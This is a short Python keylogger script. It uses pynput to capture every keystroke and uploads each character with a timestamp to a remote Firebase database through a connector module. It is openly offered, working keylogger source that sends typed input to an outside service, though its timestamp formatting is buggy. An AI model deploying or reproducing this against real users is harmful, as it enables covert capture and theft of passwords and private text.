from pynput import keyboard
import firebaseConnector
from datetime import date

today = date.today()
# import recorder

print("Starting Key Logger Program")
print("----------------------------------")

# Initialise Connector Class
firebaseConnector = firebaseConnector.FirebaseConnector()

# On Press Function
def on_press(key):
    try:
        print(key.char + " Pressed")
        keyPressTime = date.today().strftime("%d-%m-%Y_%H:%M%:%S")
        # Call keypress function
        firebaseConnector.storeKeypressData(
            {"keyPressed": key.char, "timeStamp": keyPressTime})
    except AttributeError:
        print('special key {0} pressed'.format(
            key))


def on_release(key):
    try:
        print(key.char + " Released")
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
        if key == keyboard.Key.esc:
            # Stop listener
            return False


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
